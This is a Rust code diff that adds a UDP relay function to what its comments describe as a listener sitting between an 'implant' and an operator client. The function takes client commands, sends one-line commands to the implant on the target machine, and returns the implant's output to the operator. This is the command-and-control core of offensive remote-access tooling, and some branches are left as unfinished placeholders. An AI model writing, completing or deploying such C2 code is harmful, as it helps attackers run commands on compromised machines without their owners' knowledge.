@@ -103,11 +103,37 @@ fn listen_udp(lsn: &mut Listener, address: SocketAddr, port: u16){
     lsn.status = 0;
 }
 
+// handles interaction with the implant
+// acts as a middleman between the implant and client
 fn interact_udp(lsn: &mut Listener, target: SocketAddr, relay: &mut UdpSocket) {
     println!("[+] Connection established by listener {}", lsn.id);
+    let mut is_interacting: bool = false;
     loop {
         // first check for client commands
-        
+        let cc: u8 = rcv_client_command(lsn, relay);
+        match cc {
+            3 => break,
+            4 => {
+                let mut buffer = [0;2048];
+                let (_rbytes, relay_src) = relay.recv_from(&mut buffer).unwrap();
+                // replace the value of code here to whatever we decide should specify sending a one line command to the target
+                let code: u8 = 1;
+                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
+                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&buffer[..], target);
+                buffer = [0;2048];
+                let (_tbytes, target_src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
+                if target_src == target {
+                    relay.send_to(&buffer[..], relay_src);
+                }
+            },
+            5 => {
+                let code: u8 = 2;
+                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
+            },
+            6 => is_interacting = true,
+            //7 => ,
+            _u8 => todo!(),
+        }
     }
 }
 
